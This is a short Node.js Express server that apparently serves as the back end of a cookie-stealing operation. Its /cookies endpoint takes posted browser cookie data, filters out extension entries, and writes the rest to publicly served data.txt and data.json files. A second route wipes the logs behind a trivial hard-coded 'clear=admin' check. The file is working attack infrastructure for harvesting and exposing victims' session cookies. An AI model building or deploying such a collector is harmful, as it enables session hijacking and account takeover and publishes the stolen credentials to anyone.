const bodyParser = require('body-parser');
const beautify = require('js-beautify').js
const path = require('path')
const fs = require('fs');
const express = require('express');
const app = express();

app.use(bodyParser.urlencoded({extended: false}));
app.use(bodyParser.json());

app.use(express.static(path.join(__dirname, 'public')))

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
})

app.get('/clear/:clearcookies', (req, res) => {
    if(req.params.clearcookies == 'clear=admin'){
        fs.truncateSync(path.join('public', 'data.json'), 0)
        fs.truncateSync(path.join('public', 'data.txt'), 0)

        res.send("Json Data and Data.txt Cleared Cookies...")
    } else{
        res.send("You do Not have Permission to this request")
    }
})

app.post('/cookies', (req, res) => {
    if(JSON.stringify(req.body) == "{}") {}
    else{
        let inforeq = JSON.stringify(req.body, 2);
        let datainfo = `${inforeq.replace(/"false"/g, false).replace(/"true"/g, true).replace(/"null"/g, null)}`
        datainfo = beautify(datainfo, { indent_size: 2, space_in_empty_paren: true });

        if(datainfo.includes('chrome-extension')) {}
        else{
            fs.appendFileSync(path.join(__dirname, 'public', 'data.txt'), `<pre style="margin:0px">${datainfo},</pre>`, 'utf8')
            // Json Data
            let data = fs.readFileSync(path.join('public', 'data.txt'), 'utf8')
            let parsed = data.replace(/<pre style="margin:0px">/g, "").split('</pre>').join('')
            let newparsed = "["+parsed+'{}]'
            fs.writeFileSync(path.join('public', 'data.json'), newparsed, 'utf8')
        }
    }
    res.send("Request was Sent.")
})

app.listen(process.env.PORT || 5000)